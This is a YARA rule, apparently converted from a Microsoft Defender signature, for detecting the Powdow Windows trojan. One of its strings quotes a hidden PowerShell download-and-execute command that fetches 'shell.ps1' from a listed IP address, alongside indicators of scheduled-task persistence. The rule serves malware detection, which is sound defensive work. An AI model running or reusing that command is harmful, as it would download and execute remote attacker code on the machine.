rule Trojan_Win64_Powdow_NKA_2147949973_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/Powdow.NKA!MTB"
        threat_id = "2147949973"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "TaskSchedulerCreateSchedule" ascii //weight: 1
        $x_2_2 = "-WindowStyle Hidden -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://176.124.206.88:9578/shell.ps1" ascii //weight: 2
        $x_1_3 = "powershell.exe" ascii //weight: 1
        $x_1_4 = "firefox.exe" ascii //weight: 1
        $x_1_5 = "C:\\etalon\\PocLowIL\\x64\\Release\\PocLowIL.pdb" ascii //weight: 1
        $x_1_6 = "NdrClientCall2" ascii //weight: 1
        $x_1_7 = "DllExport" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

